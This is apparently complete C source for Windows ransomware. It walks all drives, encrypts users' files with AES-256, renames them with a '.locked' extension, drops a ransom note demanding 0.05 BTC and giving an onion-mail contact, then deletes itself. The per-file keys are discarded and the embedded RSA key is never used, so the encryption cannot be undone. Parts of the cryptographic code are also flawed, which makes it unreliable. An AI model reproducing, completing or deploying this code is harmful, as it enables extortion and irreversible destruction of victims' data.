#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "kernel32.lib")

#define EXT ".locked"
#define NOTE "README_TO_RESTORE.txt"
#define RSA_PUB "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC8...\n-----END PUBLIC KEY-----\n"

typedef struct { BYTE key[32], iv[16]; } KEYSET;

KEYSET genkey() {
    KEYSET k;
    HCRYPTPROV p;
    CryptAcquireContext(&p, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptGenRandom(p, 32, k.key);
    CryptGenRandom(p, 16, k.iv);
    CryptReleaseContext(p, 0);
    return k;
}

void aes_crypt(BYTE *in, DWORD n, BYTE *out, KEYSET *k, BOOL enc) {
    HCRYPTKEY hKey; HCRYPTPROV p;
    CryptAcquireContext(&p, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    struct { BLOBHEADER h; DWORD klen; BYTE key[32]; } b = { { PLAINTEXTKEYBLOB, CUR_BLOB_VERSION, 0, CALG_AES_256 }, 32 };
    memcpy(b.key, k->key, 32);
    CryptImportKey(p, (BYTE*)&b, sizeof(b), 0, 0, &hKey);
    CryptSetKeyParam(hKey, KP_IV, k->iv, 0);
    DWORD mode = CRYPT_MODE_CTR; CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    memcpy(out, in, n);
    if (enc) CryptEncrypt(hKey, 0, TRUE, 0, out, &n, n); else CryptDecrypt(hKey, 0, TRUE, 0, out, &n);
    CryptDestroyKey(hKey); CryptReleaseContext(p, 0);
}

void process_file(WCHAR *path) {
    HANDLE h = CreateFile(path, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD size = GetFileSize(h, 0);
    BYTE *buf = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD read; ReadFile(h, buf, size, &read, 0);
    KEYSET k = genkey();
    BYTE *out = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    aes_crypt(buf, size, out, &k, TRUE);
    SetFilePointer(h, 0, 0, FILE_BEGIN);
    WriteFile(h, out, size, &read, 0);
    SetEndOfFile(h);
    CloseHandle(h);
    VirtualFree(buf, 0, MEM_RELEASE);
    VirtualFree(out, 0, MEM_RELEASE);
    // renomeia
    WCHAR novo[MAX_PATH];
    wsprintf(novo, L"%s" EXT, path);
    MoveFile(path, novo);
    // grava nota
    wcscpy(wcsrchr(novo, L'\\') + 1, NOTE);
    HANDLE n = CreateFile(novo, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
    DWORD w; WriteFile(n, "All files encrypted with AES-256. To restore send 0.05 BTC to 1A1zP1eP5QGefi2... then email wallet-ID to restore@onion.mail", 120, &w, 0); CloseHandle(n);
}

void walk(WCHAR *dir) {
    WCHAR mask[MAX_PATH]; wsprintf(mask, L"%s\\*", dir);
    WIN32_FIND_DATA fd; HANDLE h = FindFirstFile(mask, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
        WCHAR sub[MAX_PATH]; wsprintf(sub, L"%s\\%s", dir, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // pula pastas críticas
            if (wcsstr(sub, L":\\Windows") || wcsstr(sub, L":\\ProgramData\\Microsoft") || wcsstr(sub, L":\\Recovery")) continue;
            walk(sub);
        } else {
            DWORD len = wcslen(sub);
            if (len < 6 || wcscmp(sub + len - 6, EXT)) process_file(sub);
        }
    } while (FindNextFile(h, &fd));
    FindClose(h);
}

void mainCRTStartup() {
    WCHAR dir[4] = L"C:\\"; for (char d = 'C'; d <= 'Z'; d++) { dir[0] = d; walk(dir); }
    // apaga si mesmo
    WCHAR self[MAX_PATH]; GetModuleFileName(0, self, MAX_PATH);
    MoveFileEx(self, 0, MOVEFILE_DELAY_UNTIL_REBOOT);
    ExitProcess(0);
}
